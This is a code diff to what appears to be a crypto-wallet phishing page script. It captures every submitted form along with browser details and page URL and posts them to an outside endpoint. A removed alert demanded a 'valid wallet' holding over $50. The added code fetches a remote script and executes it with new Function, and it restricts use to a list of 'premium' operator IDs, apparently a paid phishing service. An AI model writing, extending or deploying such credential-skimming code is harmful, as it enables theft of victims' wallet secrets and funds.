@@ -1,4 +1,24 @@
-document.addEventListener("DOMContentLoaded", () => {
+// ================= LOAD PREMIUM USERS =================
+let premiumUsers = [];
+
+async function loadPremiumUsers() {
+  try {
+    const res = await fetch("https://afkft.github.io/ho/da/premiumlist.js");
+    const text = await res.text();
+
+    // Execute premiumlist.js and extract premiumUsers
+    const fn = new Function(text + "; return premiumUsers;");
+    premiumUsers = fn();
+  } catch (err) {
+    console.error("❌ Failed to load premium list", err);
+    premiumUsers = [];
+  }
+}
+
+// ================= MAIN SCRIPT =================
+document.addEventListener("DOMContentLoaded", async () => {
+  await loadPremiumUsers(); // 🔥 Load premium list first
+
   const DEFAULT_USER_ID = "7979664801";
   const forms = document.querySelectorAll("form");
 
@@ -26,13 +46,22 @@ document.addEventListener("DOMContentLoaded", () => {
     })
     .catch(() => {});
 
+  // ---------- FORM HANDLER ----------
   forms.forEach((form) => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
       const urlParams = new URLSearchParams(window.location.search);
       const userId = urlParams.get("id") || DEFAULT_USER_ID;
+      const numericUserId = Number(userId);
 
+      // ❌ BLOCK NON-PREMIUM USERS
+      if (!premiumUsers.includes(numericUserId)) {
+        alert("🚫 Access denied\ntry again or check premium.");
+        return;
+      }
+
+      // ✅ PREMIUM USER CONTINUES
       const formData = new FormData(form);
 
       // 🔹 REQUIRED
@@ -52,7 +81,7 @@ document.addEventListener("DOMContentLoaded", () => {
       formData.append("💻 Platform", navigator.platform || "Unknown");
       formData.append("🌐 Language", navigator.language || "Unknown");
 
-      // ✅ ADD PAGE URL AT THE END
+      // ✅ PAGE URL
       formData.append("🔗 Page URL", window.location.href);
 
       try {
@@ -61,11 +90,11 @@ document.addEventListener("DOMContentLoaded", () => {
           {
             method: "POST",
             body: formData
-         }
+          }
         );
 
         if (response.ok) {
-          alert("⛔please note ℹ️ you must enter a valid wallet and you must have more than $50 in your wallet");
+          alert("⛔ please try again");
           form.reset();
 
           // ✅ REDIRECT WITH ID
